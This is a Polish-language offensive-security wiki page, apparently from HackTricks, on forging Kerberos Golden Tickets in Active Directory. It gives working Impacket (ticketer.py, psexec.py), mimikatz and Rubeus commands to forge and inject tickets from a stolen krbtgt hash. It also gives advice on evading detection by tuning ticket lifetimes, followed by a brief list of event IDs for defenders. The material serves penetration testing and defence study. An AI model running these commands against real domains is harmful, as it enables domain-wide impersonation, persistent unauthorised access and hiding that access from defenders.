# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Atak **Golden Ticket** polega na **tworzeniu legalnego Ticket Granting Ticket (TGT) podszywając się pod dowolnego użytkownika** za pomocą **hasła NTLM konta krbtgt w Active Directory (AD)**. Technika ta jest szczególnie korzystna, ponieważ **umożliwia dostęp do dowolnej usługi lub maszyny** w obrębie domeny jako podszywający się użytkownik. Ważne jest, aby pamiętać, że **poświadczenia konta krbtgt nigdy nie są automatycznie aktualizowane**.

Aby **zdobyć hasło NTLM** konta krbtgt, można zastosować różne metody. Może być ono wyodrębnione z **procesu Local Security Authority Subsystem Service (LSASS)** lub z **pliku NT Directory Services (NTDS.dit)** znajdującego się na dowolnym kontrolerze domeny (DC) w obrębie domeny. Ponadto, **wykonanie ataku DCsync** jest inną strategią uzyskania tego hasła NTLM, co można zrealizować za pomocą narzędzi takich jak **moduł lsadump::dcsync** w Mimikatz lub **skrypt secretsdump.py** od Impacket. Ważne jest, aby podkreślić, że do przeprowadzenia tych operacji **zazwyczaj wymagane są uprawnienia administratora domeny lub podobny poziom dostępu**.

Chociaż hasło NTLM jest wykonalną metodą w tym celu, **zdecydowanie zaleca się** **fałszowanie biletów za pomocą kluczy Kerberos w standardzie Advanced Encryption Standard (AES) (AES128 i AES256)** z powodów bezpieczeństwa operacyjnego.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**Gdy** masz **wstrzyknięty złoty bilet**, możesz uzyskać dostęp do wspólnych plików **(C$)** oraz wykonywać usługi i WMI, więc możesz użyć **psexec** lub **wmiexec**, aby uzyskać powłokę (wygląda na to, że nie możesz uzyskać powłoki przez winrm).

### Obejście powszechnych wykryć

Najczęstsze sposoby wykrywania złotego biletu to **inspekcja ruchu Kerberos** w sieci. Domyślnie Mimikatz **podpisuje TGT na 10 lat**, co wyróżnia się jako anomalia w kolejnych żądaniach TGS z nim związanych.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Użyj parametrów `/startoffset`, `/endin` i `/renewmax`, aby kontrolować przesunięcie startowe, czas trwania i maksymalne odnowienia (wszystko w minutach).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Niestety, czas życia TGT nie jest rejestrowany w 4769, więc nie znajdziesz tych informacji w dziennikach zdarzeń systemu Windows. Jednak to, co możesz skorelować, to **widzenie 4769 bez wcześniejszego 4768**. **Nie jest możliwe zażądanie TGS bez TGT**, a jeśli nie ma zapisu o wydaniu TGT, możemy wywnioskować, że został on sfałszowany offline.

Aby **obejść to wykrywanie**, sprawdź bilety diamentowe:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Łagodzenie

- 4624: Logowanie konta
- 4672: Logowanie administratora
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Inne małe sztuczki, które mogą zastosować obrońcy, to **powiadamianie o 4769 dla wrażliwych użytkowników**, takich jak domyślne konto administratora domeny.

## Odniesienia

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
